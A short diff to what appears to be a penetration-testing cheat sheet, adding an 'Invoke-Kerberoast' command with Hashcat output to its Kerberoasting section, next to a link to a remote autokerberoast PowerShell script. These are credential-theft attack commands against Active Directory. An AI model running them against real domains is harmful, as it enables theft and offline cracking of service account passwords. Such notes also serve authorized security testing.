@@ -357,6 +357,8 @@ If powershell not enabled or unable to run BloodHound this script will find admi
 
 ### Kerberoasting
 
+`Invoke-Kerberoast -erroraction silentlycontinue -OutputFormat Hashcat`
+
 https://raw.githubusercontent.com/xan7r/kerberoast/master/autokerberoast.ps1
 
 Invoke-AutoKerberoast
